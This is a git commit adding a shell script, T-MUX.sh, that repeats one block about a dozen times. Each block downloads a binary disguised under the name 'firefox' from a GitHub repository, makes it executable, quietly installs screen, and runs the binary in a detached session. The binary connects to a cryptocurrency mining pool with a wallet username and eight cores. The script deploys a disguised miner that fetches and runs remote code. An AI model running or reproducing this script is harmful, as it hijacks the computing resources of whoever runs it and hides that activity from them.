65bbe2249aa9290de17621b2d75d91b286cfff66
obisumila <obisumila@gmail.com>
2024-09-24 05:33:55 +0800

    Add files via upload

---
+++ T-MUX.sh
@@ -0,0 +1,117 @@
+wget https://github.com/obisumila/crispy-guacamole/raw/refs/heads/main/firefox ;
+chmod +x firefox ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S ps -dm ./firefox --url ws://tw-pool.com:5487/mine mine --username HA91MkXhWfKJXCYjeFxzAucjeG6pQ849GFun5x5Cndsh.ryzen9 --cores 8 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+
+wget https://github.com/obisumila/crispy-guacamole/raw/refs/heads/main/firefox ;
+chmod +x firefox ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S ps -dm ./firefox --url ws://tw-pool.com:5487/mine mine --username HA91MkXhWfKJXCYjeFxzAucjeG6pQ849GFun5x5Cndsh.ryzen9 --cores 8 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+
+wget https://github.com/obisumila/crispy-guacamole/raw/refs/heads/main/firefox ;
+chmod +x firefox ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S ps -dm ./firefox --url ws://tw-pool.com:5487/mine mine --username HA91MkXhWfKJXCYjeFxzAucjeG6pQ849GFun5x5Cndsh.ryzen9 --cores 8 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+
+wget https://github.com/obisumila/crispy-guacamole/raw/refs/heads/main/firefox ;
+chmod +x firefox ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S ps -dm ./firefox --url ws://tw-pool.com:5487/mine mine --username HA91MkXhWfKJXCYjeFxzAucjeG6pQ849GFun5x5Cndsh.ryzen9 --cores 8 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+
+wget https://github.com/obisumila/crispy-guacamole/raw/refs/heads/main/firefox ;
+chmod +x firefox ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S ps -dm ./firefox --url ws://tw-pool.com:5487/mine mine --username HA91MkXhWfKJXCYjeFxzAucjeG6pQ849GFun5x5Cndsh.ryzen9 --cores 8 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+
+wget https://github.com/obisumila/crispy-guacamole/raw/refs/heads/main/firefox ;
+chmod +x firefox ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S ps -dm ./firefox --url ws://tw-pool.com:5487/mine mine --username HA91MkXhWfKJXCYjeFxzAucjeG6pQ849GFun5x5Cndsh.ryzen9 --cores 8 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+
+wget https://github.com/obisumila/crispy-guacamole/raw/refs/heads/main/firefox ;
+chmod +x firefox ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S ps -dm ./firefox --url ws://tw-pool.com:5487/mine mine --username HA91MkXhWfKJXCYjeFxzAucjeG6pQ849GFun5x5Cndsh.ryzen9 --cores 8 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+
+wget https://github.com/obisumila/crispy-guacamole/raw/refs/heads/main/firefox ;
+chmod +x firefox ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S ps -dm ./firefox --url ws://tw-pool.com:5487/mine mine --username HA91MkXhWfKJXCYjeFxzAucjeG6pQ849GFun5x5Cndsh.ryzen9 --cores 8 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+wget https://github.com/obisumila/crispy-guacamole/raw/refs/heads/main/firefox ;
+chmod +x firefox ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S ps -dm ./firefox --url ws://tw-pool.com:5487/mine mine --username HA91MkXhWfKJXCYjeFxzAucjeG6pQ849GFun5x5Cndsh.ryzen9 --cores 8 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+
+wget https://github.com/obisumila/crispy-guacamole/raw/refs/heads/main/firefox ;
+chmod +x firefox ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S ps -dm ./firefox --url ws://tw-pool.com:5487/mine mine --username HA91MkXhWfKJXCYjeFxzAucjeG6pQ849GFun5x5Cndsh.ryzen9 --cores 8 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+wget https://github.com/obisumila/crispy-guacamole/raw/refs/heads/main/firefox ;
+chmod +x firefox ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S ps -dm ./firefox --url ws://tw-pool.com:5487/mine mine --username HA91MkXhWfKJXCYjeFxzAucjeG6pQ849GFun5x5Cndsh.ryzen9 --cores 8 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+
+wget https://github.com/obisumila/crispy-guacamole/raw/refs/heads/main/firefox ;
+chmod +x firefox ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S ps -dm ./firefox --url ws://tw-pool.com:5487/mine mine --username HA91MkXhWfKJXCYjeFxzAucjeG6pQ849GFun5x5Cndsh.ryzen9 --cores 8 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
